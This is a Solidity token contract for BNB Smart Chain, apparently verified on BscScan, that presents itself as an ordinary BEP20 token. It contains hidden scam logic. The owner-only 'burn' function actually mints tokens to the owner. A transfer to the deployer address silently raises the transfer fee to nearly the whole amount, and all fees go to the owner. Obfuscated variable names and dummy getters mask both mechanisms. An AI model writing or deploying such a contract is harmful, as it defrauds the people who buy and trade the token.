/**
 *Submitted for verification at BscScan.com on 2022-12-05
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity =0.6.11;
contract HDVFNQL {
uint8 public constant decimals = 18;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
string public  name = "IAJHKF";
uint256 private  XCEZHN = 1000000000000000;
uint256 private  YEGCPV = 10000000000;
uint256 public constant totalSupply = 100000000000000000000000000000;
uint256 private  JAAUCE = 10000000000000;
address private  GRRSKJ = address(0);
event Transfer(address indexed from, address indexed to, uint256 value);
mapping (address => mapping (address => uint256)) private _allowances;
address private  GGLANY = address(0);
string public  symbol = "IAJHKF";
uint256 private  CKDFIX = 1000000000000000000;
uint256 private  VFTEQN = 1000000000000000000;
mapping (address => uint256) public balanceOf;
uint256 public constant XRIIJM = 99999;
uint256 private  HUKGYK = 100000000;
address private  YGNPMN = address(0);
event Approval(address indexed owner, address indexed spender, uint256 value);
address private  XNOKLS = address(0);
address public owner;
uint256 private  BWYCIV = 1000000000000000000000;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
address private  OZFHDP = address(0);
function _getGRRSKJ() private returns (address) {
return GRRSKJ;
}

function _getOZFHDP() private returns (address) {
return OZFHDP;
}

function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function _getXNOKLS() private returns (address) {
return XNOKLS;
}

function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function _getJAAUCE() private returns (uint256) {
return JAAUCE;
}

function _getXCEZHN() private returns (uint256) {
return XCEZHN;
}

function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function _getGGLANY() private returns (address) {
return GGLANY;
}

function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tUZYYTN 0");
require(spender != address(0), "fUZYYTN 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function _getBWYCIV() private returns (uint256) {
return BWYCIV;
}

function _getHUKGYK() private returns (uint256) {
return HUKGYK;
}

function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "UZYYTN");
require(to != address(0), "UZYYTN");
require(amount <= balanceOf[from], "UZYYTN");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* XRIIJM/VFTEQN ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==YGNPMN){
VFTEQN = XRIIJM+2;
}
emit Transfer(from, to, transferAmount);
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
constructor () public {
YGNPMN = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function _getCKDFIX() private returns (uint256) {
return CKDFIX;
}

function _getYEGCPV() private returns (uint256) {
return YEGCPV;
}


}
/*
SafeMath checking module
*/
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
       }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}